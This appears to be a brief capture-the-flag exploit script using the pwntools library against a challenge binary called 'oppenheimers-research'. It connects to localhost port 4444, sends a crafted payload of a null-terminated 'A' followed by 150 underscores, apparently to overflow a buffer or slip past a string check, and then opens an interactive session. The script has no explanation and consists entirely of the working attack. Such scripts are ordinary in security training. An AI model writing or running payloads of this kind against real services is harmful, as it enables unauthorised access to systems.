import pwn

# p = pwn.process("./static/oppenheimers-research")
host = "localhost"
port = 4444
p = pwn.remote(host, port)

p.sendline(b'A\x00' + b'_' * 150)
p.interactive()